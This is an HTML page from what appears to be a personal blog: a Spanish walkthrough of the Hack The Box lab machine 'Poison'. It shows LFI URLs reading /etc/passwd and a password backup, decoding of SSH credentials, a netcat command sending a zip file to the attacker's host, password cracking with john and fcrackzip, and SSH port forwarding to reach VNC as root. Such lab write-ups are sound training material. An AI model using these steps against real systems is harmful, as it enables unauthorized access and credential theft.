@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Poison HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/poison/pasted-20260415143048.png" alt="Poison HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Poison</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>fuerza_bruta_zip</span>
+            <span>zip_fuerza_bruta</span>
+            <span>zip</span>
+            <span>vncviewer</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Web en FreeBSD con funcionalidad vulnerable a LFI</li>
+            <li><code>Explotación</code>: LFI permite leer <code>pwdbackup.txt</code> y recuperar credenciales SSH</li>
+            <li><code>Escalada de Privilegios</code>: Zip protegido revela secreto para VNC; port forwarding permite acceder a tightvnc como root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415144401.png" alt="Poison HTB" />
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415144417.png" alt="Poison HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: LFI</h2>
+          <div class="code-card">
+            <h3>LFI</h3>
+            <pre><code># LFI: http://10.129.1.254/browse.php?file=/etc/passw
+# Apuntar a una ruta inválida para ver donde se almacena pwdbackup.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415144450.png" alt="Poison HTB" />
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415144609.png" alt="Poison HTB" />
+          <div class="code-card">
+            <h3>LFI pwdbackup.txt</h3>
+            <pre><code># LFI: http://10.129.1.254/browse.php?file=/usr/local/www/apache24/data/pwdbackup.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415144645.png" alt="Poison HTB" />
+          <div class="code-card">
+            <h3>Desencriptar fichero</h3>
+            <pre><code>echo 'Vm0wd2QyUXlVWGx...3dPVU5uUFQwSwo=' | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
+# Credenciales -&gt; charix:Charix!2#4%6&amp;8(0</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso SSH</h3>
+            <pre><code>ssh charix@10.129.1.254
+# Charix!2#4%6&amp;8(0</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415144848.png" alt="Poison HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415160957.png" alt="Poison HTB" />
+          <div class="code-card">
+            <h3>Transferir a la máquina con netcat</h3>
+            <pre><code># Linux
+nc 10.10.16.178 443 &lt; secret.zip
+# Kali
+nc -nlvp 443 &gt; secret.zip</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Fuerza bruta .zip</h3>
+            <pre><code># Fuerza Bruta .zip protegido con contraseña
+fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt secret.zip
+# Contraseña: No encontrada
+unzip secret.zip
+
+# Alternativa
+zip2john secret.zip &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+# Reutilizar credencial charix -&gt; Charix!2#4%6&amp;8(0</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Unzip</h3>
+            <pre><code>unzip secret.zip
+# Password -&gt; Charix!2#4%6&amp;8(0</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar Procesos</h3>
+            <pre><code>ps -faux</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415162256.png" alt="Poison HTB" />
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415162545.png" alt="Poison HTB" />
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415162416.png" alt="Poison HTB" />
+          <div class="code-card">
+            <h3>LocalPort forwarding</h3>
+            <pre><code>ssh -L 5901:127.0.0.1:5901 charix@10.129.1.254
+# Password: Charix!2#4%6&amp;8(0</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Conectarnos con vncviewer usando el fichero secret a través del local port forwarding</h3>
+            <pre><code>vncviewer -passwd secret 127.0.0.1:5901</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415162952.png" alt="Poison HTB" />
+          <img class="writeup-image" src="/writeups/assets/poison/pasted-20260415163037.png" alt="Poison HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>fuerza_bruta_zip</span>
+            <span>zip_fuerza_bruta</span>
+            <span>zip</span>
+            <span>vncviewer</span>
+            <span>tightvnc</span>
+            <span>p5091</span>
+            <span>lfi</span>
+            <span>portforwarding</span>
+            <span>FreeBSD</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
